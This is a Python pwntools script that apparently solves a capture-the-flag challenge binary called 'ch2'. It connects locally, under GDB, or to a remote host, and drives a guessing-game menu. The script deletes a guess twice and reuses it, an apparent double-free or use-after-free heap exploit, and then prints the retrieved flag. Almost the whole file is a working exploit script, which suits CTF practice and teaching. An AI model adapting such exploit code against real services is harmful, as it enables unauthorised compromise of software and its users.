#!/usr/bin/env python3
import json
from pwn import *

context.log_level = 'error'

exe = ELF("./ch2")
libc = ELF('libc.so.6')

context.binary = exe

io = None

def conn():
    if args.LOCAL:
        io = process([exe.path], env={"LD_PRELOAD":"./libc.so.6"})
    elif args.GDB:
        io = gdb.debug([exe.path], env={"LD_PRELOAD":"./libc.so.6"}, gdbscript="""
        b *menu+228
        b *menu+555
        c
        """)
    else:
        io = remote(args.HOST, args.PORT, ssl=args.SSL)
        if args.TEAM_TOKEN:
            io.sendlineafter(b"token: ", args.TEAM_TOKEN.encode())

    return io


def take_guess(guess):
    global io
    io.sendlineafter(b"Exit\n> ", b"1")
    io.sendlineafter(b"Please write your guess: ", guess)

def confirm_guess(y_n):
    global io
    io.sendlineafter(b"Exit\n> ", b"2")
    io.recvuntil(b"guess is: ")
    current_guess = io.recvuntil(b"Are you sure")
    x = current_guess.find(b"Are you sure")
    current_guess = current_guess[:x].strip()
    io.sendlineafter(b"(y/n): ", y_n)
    return current_guess

def delete_guess():
    global io
    io.sendlineafter(b"Exit\n> ", b"3")

def gen_new_value():
    global io
    io.sendlineafter(b"Exit\n> ", b"4")

def quit():
    global io
    io.sendlineafter(b"Exit\n> ", b"5")



def main():
    global io
    io = conn()

    take_guess(b"ciao")
    delete_guess()
    delete_guess()
    gen_new_value()
    take_guess(b"ciao")
    confirm_guess(b"y")

    io.recvuntil(b"I guess you win this time... ")
    flag = io.clean().decode().strip()
    print(flag)

if __name__ == "__main__":
    main()
